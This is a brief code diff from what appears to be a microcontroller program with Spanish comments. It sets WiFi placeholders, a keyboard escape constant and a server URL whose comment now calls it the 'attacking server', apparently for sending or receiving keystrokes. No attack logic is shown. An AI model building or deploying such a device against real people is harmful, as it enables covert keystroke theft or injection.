@@ -16,7 +16,7 @@ const char* ssid     = ""; //Nombre de la red WiFi
 const char* password = ""; //Contraseña de la red WiFi
 
 // Servidor local
-const char* serverURL = "http://192.168.1.43:5555/key"; // Ajusta IP/puerto
+const char* serverURL = "http://192.168.1.43:5555/key"; // Ajusta IP/puerto según el servidor atacante
 
 // Comandos especiales
 #define CMD_ESC        0x1B
